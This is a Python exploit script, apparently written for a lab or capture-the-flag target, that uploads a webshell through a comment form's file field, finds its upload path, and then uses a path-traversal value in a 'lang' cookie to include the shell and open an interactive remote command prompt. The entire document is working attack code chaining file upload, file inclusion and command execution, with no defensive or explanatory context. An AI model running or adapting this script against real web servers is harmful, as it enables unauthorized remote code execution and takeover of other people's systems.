import requests
import sys
import re, cmd

if len(sys.argv) < 3:
	print(f"[+] Run python {sys.argv[0]} url webshell.txt")
	sys.exit()
	
s = requests.Session()

url = sys.argv[1]
# comment
cmt = {
	'comment': 'aaaa'
}
# file
files = {
	'file': open(sys.argv[2], 'rb')
}

# proxies = {
# 	'http': 'http://127.0.0.1:8080'
# }
r = s.get(url=url)
res = s.post(url=url, data=cmt, files=files, verify=False)
cookies = dict(s.cookies.items())

# extract folder payload
pattern = r"upload/[\w]{32}/" + sys.argv[2]
c = re.findall(pattern=pattern, string=res.text)

class shell(cmd.Cmd):
	prompt = 'cmd> '
	def default(self, line: str):
			headers = {
				'Cookie': f"lang=../{c[0]}"    
			}
			pram = { 'cmd': f'{line}'}
			res = s.post(url=url, params=pram, headers=headers, verify=False)
			pattern = r"<pre>((.|\n)*)</pre>"
			data = re.findall(pattern, res.text)[0]
			print(data[0])

if __name__ == '__main__':
	shell().cmdloop()
